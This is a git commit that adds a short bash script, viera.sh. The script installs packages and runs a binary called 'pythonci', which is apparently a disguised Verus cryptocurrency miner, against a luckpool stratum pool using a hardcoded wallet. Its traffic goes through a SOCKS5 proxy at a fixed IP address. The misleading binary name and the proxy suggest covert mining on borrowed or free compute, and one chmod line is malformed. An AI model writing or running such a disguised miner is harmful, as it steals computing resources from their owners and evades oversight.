79c517e1f9f236547c86a6203979e4ef57c73db2
raenaviera <88834064+raenaviera@users.noreply.github.com>
2021-08-12 18:59:30 +0700

    Create viera.sh

---
+++ viera.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+chmod +x viera.sh && chmod +x pythonci chmod 777 pythonci viera.sh
+screen -dmS ls
+PL=stratum+tcp://na.luckpool.net:3956
+WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WR=VIA-040
+PY=socks5://104.248.48.172:30588
+./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
+
